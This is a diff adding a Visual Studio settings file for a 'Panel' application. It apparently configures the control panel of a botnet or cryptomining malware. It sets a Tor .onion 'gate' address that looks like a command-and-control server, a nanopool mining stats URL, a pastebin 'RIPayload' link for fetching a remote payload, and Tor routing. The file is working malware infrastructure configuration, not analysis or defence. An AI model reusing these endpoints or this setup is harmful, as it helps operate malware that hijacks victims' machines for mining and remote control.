@@ -1,0 +1,30 @@
+﻿<?xml version='1.0' encoding='utf-8'?>
+<SettingsFile xmlns="http://schemas.microsoft.com/VisualStudio/2004/01/settings" CurrentProfile="(Default)" GeneratedClassNamespace="Panel.Properties" GeneratedClassName="Settings">
+  <Profiles />
+  <Settings>
+    <Setting Name="GateLocation" Type="System.String" Scope="User">
+      <Value Profile="(Default)">https://orion34hchpyg2s5orienucaley5f5c6dmfzsdnkvf555yk7dwpibzid.onion:7019/</Value>
+    </Setting>
+    <Setting Name="UpdateInterval" Type="System.UInt16" Scope="User">
+      <Value Profile="(Default)">5</Value>
+    </Setting>
+    <Setting Name="MiningStats" Type="System.String" Scope="User">
+      <Value Profile="(Default)">https://pasc.nanopool.org/stats</Value>
+    </Setting>
+    <Setting Name="Prefix" Type="System.String" Scope="User">
+      <Value Profile="(Default)">Doctor-</Value>
+    </Setting>
+    <Setting Name="Username" Type="System.String" Scope="User">
+      <Value Profile="(Default)" />
+    </Setting>
+    <Setting Name="APIKey" Type="System.String" Scope="User">
+      <Value Profile="(Default)" />
+    </Setting>
+    <Setting Name="RIPayload" Type="System.String" Scope="User">
+      <Value Profile="(Default)">https://pastebin.com/raw/xDwZLbRH</Value>
+    </Setting>
+    <Setting Name="Tor" Type="System.Boolean" Scope="User">
+      <Value Profile="(Default)">True</Value>
+    </Setting>
+  </Settings>
+</SettingsFile>
